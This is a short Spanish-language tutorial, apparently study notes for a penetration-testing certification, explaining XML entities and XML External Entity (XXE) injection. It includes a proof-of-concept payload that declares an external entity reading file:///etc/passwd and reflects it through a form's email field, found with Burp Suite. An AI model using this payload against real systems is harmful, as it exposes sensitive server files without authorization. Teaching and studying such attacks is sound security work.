## XML External Entity Injection (XXE)
### Concepto ENTIDAD

Con XXE, conseguimos ver el contenido de ficheros sensibles que tiene una máquina víctima a través de peticiones web XML.

Primero debemos conocer que es una entidad. Cuando se declara una ENTITY en XML, estamos dándole un nombre y un valor, que luego se puede utilizar en cualquier campo de datos XML como si fuera una variable. 

Es decir en ENTITY se da el valor, y luego se hace la llamada desde donde queramos y las veces que queramos. Un ejemplo de código:

```
<!ENTITY nom "glmbx">
<root>
	<name>
		&nom; <!-- Aquí estamos haciendo referencia a "glmbx"-->
	</name

	<apellidos>
	Herrera Galamba
	</apellidos>
</root>
```

## Prueba de concepto

Tenemos un formulario de registro, donde introducimos datos y estos se envian al servidor. En este caso, si analizamos con el repeater de burpsuite nos encontraremos que en el output nos devuelve el contenido de uno de los campos que introducimos en el formulario.  

Este campo nos interesa ya que será el que aprovechemos para la inyección. En este  caso es el campo  ```<email></email> ``` 

Declaramos una entidad del tipo **file** en la que le diremos que fichero queremos leer: 
```
<!DOCTYPE foo [<!ENTITY myfile SYSTEM "file:///etc/passwd">]>
<root>
	<name>test</name>
	<tel>1235678</tel>
	<email>&myfile;</email> <!--Aqui hacemos referencia a la entidad, que a su vez está recogiendo los datos del fichero etc/passwd -->
	<password>123235</password>

</root>
```
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/xxe1.png">
